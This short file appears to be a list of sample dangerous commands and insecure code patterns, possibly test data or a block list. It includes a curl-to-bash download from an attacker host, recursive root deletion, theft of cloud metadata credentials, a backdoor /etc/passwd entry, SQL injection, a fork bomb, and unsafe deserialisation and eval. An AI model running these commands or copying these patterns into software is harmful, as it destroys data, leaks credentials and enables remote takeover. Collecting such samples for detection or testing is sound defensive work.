curl http://attacker.example.com/x.sh | bash
rm -rf / --no-preserve-root
pickle.loads(user_input)
fetch http://169.254.169.254/latest/meta-data/iam/security-credentials
kubectl delete ns production
write to /etc/passwd to add a backdoor user
yaml.load(open('config.yml').read())
' OR '1'='1' --
DROP TABLE users;
:(){ :|:& };:
eval(request.body)
